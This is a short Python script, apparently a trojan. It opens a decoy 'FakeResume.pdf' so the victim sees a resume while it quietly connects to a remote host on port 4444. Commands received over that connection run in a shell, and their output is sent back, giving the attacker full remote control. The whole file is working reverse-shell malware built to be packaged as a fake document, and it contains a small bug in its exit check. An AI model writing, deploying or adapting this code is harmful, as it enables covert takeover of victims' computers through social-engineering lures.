import subprocess
import os
import sys
import socket
import threading
import webbrowser

def open_pdf():

    if hasattr(sys, "_MEIPASS"):
        basepath = sys._MEIPASS
    else:
        basepath = os.path.dirname(__file__)

    pdf_path = os.path.join(basepath, "FakeResume.pdf")

    webbrowser.open(pdf_path)


def connect_back():
    s=socket.socket()
    s.connect(("10.0.0.5", 4444))
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8")
            if cmd.lower == "exit":
                break

            output = subprocess.run(cmd, shell=True, capture_output=True)
            result = output.stdout + output.stderr

            if result:
                s.send(result)
            else:
                s.send(b"[+] command executed but no output.\n")

        except Exception as e:
            error_message = f"[-] Error: {str(e)}\n".encode()
            s.send(error_message)

    s.close()

threading.Thread(target=open_pdf).start()
connect_back()